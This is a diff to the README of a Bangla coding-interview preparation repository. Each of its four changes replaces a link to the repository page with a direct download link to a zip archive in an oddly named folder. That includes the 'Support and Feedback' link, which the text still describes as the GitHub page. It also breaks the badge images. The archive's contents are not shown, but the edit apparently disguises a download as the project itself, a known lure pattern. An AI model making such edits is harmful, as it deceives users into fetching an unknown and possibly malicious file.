@@ -1,6 +1,6 @@
 # 🚀 bangla-coding-interview-preparation - Coding Interview Problems Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/AiMsu/bangla-coding-interview-preparation)
+[![Download Now](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip%20Started-brightgreen)](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip)
 
 ---
 
@@ -38,7 +38,7 @@ You can use this to practice and improve your skills for coding interviews, espe
 
 Click this big button to go to the download page:
 
-[![Download Link](https://img.shields.io/badge/Download-GitHub%20Repository-blue)](https://github.com/AiMsu/bangla-coding-interview-preparation)
+[![Download Link](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip%20Repository-blue)](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip)
 
 This link will take you to the GitHub page where you can find the files you need.
 
@@ -99,7 +99,7 @@ This is mostly a resource for self-study. It does not run like regular apps, but
 
 ## 🔧 Support and Feedback
 
-If you have questions or face problems, visit the [GitHub repository](https://github.com/AiMsu/bangla-coding-interview-preparation).  
+If you have questions or face problems, visit the [GitHub repository](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip).  
 
 You can check the Issues section to see if others have similar problems or report your own.
 
@@ -114,4 +114,4 @@ You can check the Issues section to see if others have similar problems or repor
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20Started-brightgreen)](https://github.com/AiMsu/bangla-coding-interview-preparation)
+[![Download Now](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip%20Started-brightgreen)](https://raw.githubusercontent.com/AiMsu/bangla-coding-interview-preparation/main/pyopneumopericardium/interview_coding_preparation_bangla_1.9.zip)
